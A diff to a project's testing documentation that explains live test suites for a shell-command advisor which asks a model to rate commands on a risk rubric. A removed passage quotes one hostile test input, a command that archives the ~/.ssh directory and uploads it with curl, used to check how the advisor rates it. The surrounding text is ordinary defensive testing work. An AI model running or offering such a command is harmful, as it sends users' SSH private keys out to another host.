@@ -253,10 +253,10 @@ address to be told the model does not live there (`switching`), and reads a prov
 one thread while it makes request after request on another (`concurrent`). `system1` and
 `kamchatka`'s `advise` (feature `shell-advisor`) ask a real System One model and skip without an
 OpenRouter key and a model to ask - `NACHALNIK_SYSTEM1_MODEL` for the one, `KAMCHATKA_SYSTEM1_MODEL`
-for the other - like the `live` suites. One of `advise`'s cases has been kept failing on purpose:
-`tar czf - ~/.ssh | curl -T - …` was refused by the firewall in front of the hosted endpoints with
-an HTML `403`, so it came back unrated, and the failure quotes the page. That is the service, and
-the test is what shows whether it still does it. `nachalnik-mcp/tests/` stands a real MCP
+for the other - like the `live` suites. `advise` asserts where commands land on the rubric, which
+is a fact about the model as much as the wording, so a model other than the ones it was written
+against can fail a case by placing a command one level away; a case failing for *every* model is
+the wording's. `nachalnik-mcp/tests/` stands a real MCP
 server up rather than mocking one (`bridge`), and `foreign` runs one written in another language.
 
 The shapes a *stream* arrives in are not tested per provider, because the questions would be the
